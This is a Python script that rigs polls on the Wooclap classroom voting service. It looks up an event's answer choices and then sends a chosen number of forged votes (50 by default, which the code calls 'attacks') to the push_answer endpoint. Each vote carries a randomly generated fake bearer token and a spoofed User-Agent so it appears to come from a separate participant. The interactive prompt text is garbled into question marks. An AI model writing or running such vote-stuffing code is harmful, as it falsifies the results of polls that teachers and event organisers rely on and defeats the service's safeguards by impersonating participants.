import asyncio
import datetime
import math
import random
from dataclasses import dataclass
import sys
import time
import aiohttp

import requests
from fake_useragent import UserAgent
from typing import List
ua = UserAgent()


@dataclass
class Wooclap:
    api_link: str = ''
    spam_link: str = 'https://app.wooclap.com/api/questions/'
    question_id: str = ''
    author_id: str = ''
    number_of_attacks = 50

    def exception_handler(request, exception):
        print("Request failed", request, exception)

    async def smoothly(self) -> None:
        async with aiohttp.ClientSession() as session:
            for _ in range(self.number_of_attacks):
                token: str = self.generate_token()
                async with session.post(self.spam_link + self.author_id + '/push_answer', headers={
                    'User-Agent': ua.random,
                    'authorization': f"bearer {token}"
                },
                    json={"choices": [self.question_id], "token": token}
                ) as resp:
                    if resp.status != 200:
                        time.sleep(1)

                    data = await resp.json()
                    print(data)

    def generate_token(self) -> str:
        presentDate = datetime.datetime.now()
        unix_timestamp = datetime.datetime.timestamp(presentDate)*1000
        return f"z{math.floor(random.random() * random.random() * unix_timestamp)}"

    def get_info(self) -> List[dict]:
        req = requests.get(self.api_link, json={'isParticipant': 'true', 'from': 'app'},
                           headers={
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'User-Agent': ua.random,
            'authorization': f"bearer {self.generate_token()}"
        }
        ).json()
        self.author_id = req.get('selectedQuestion')
        if not self.author_id:
            sys.exc_info('author_id = None')
        # print(req.get('questions')[-1].get('choices'))
        return req.get('questions')[-1].get('choices')

    def start(self):
        # self.api_link: str = 'https://app.wooclap.com/api/events/' + 'www.wooclap.com/GNTAZP'.split('/')[-1]  #
        self.api_link = 'https://app.wooclap.com/api/events/' + input('?????????????? ????????????: ').split('/')[-1]  #
        answers: List[dict] = self.get_info()
        for num, answer in enumerate(answers):
            print(f'{num+1})', answer.get('choice'))
        question_number: int = int(input('?????????????? ?????????? ???????????? '))
        self.question_id: str = answers[question_number-1].get('_id')
        n_of_a = input('?????????????? ??????-???? ??????????????(50): ')
        if n_of_a != '':
            self.number_of_attacks: int = int(n_of_a)
        # type_attack: int = int(input('1) ????????????\n2) ????????????(Beta)\n?????????????? ?????? ??????????: '))
        type_attack: int = 1
        if type_attack == 1:
            asyncio.get_event_loop().run_until_complete(self.smoothly())
        # elif type_attack == 2:
        #     asyncio.get_event_loop().run_until_complete(self.spam())


W = Wooclap()
W.start()

# print(W.get_info())
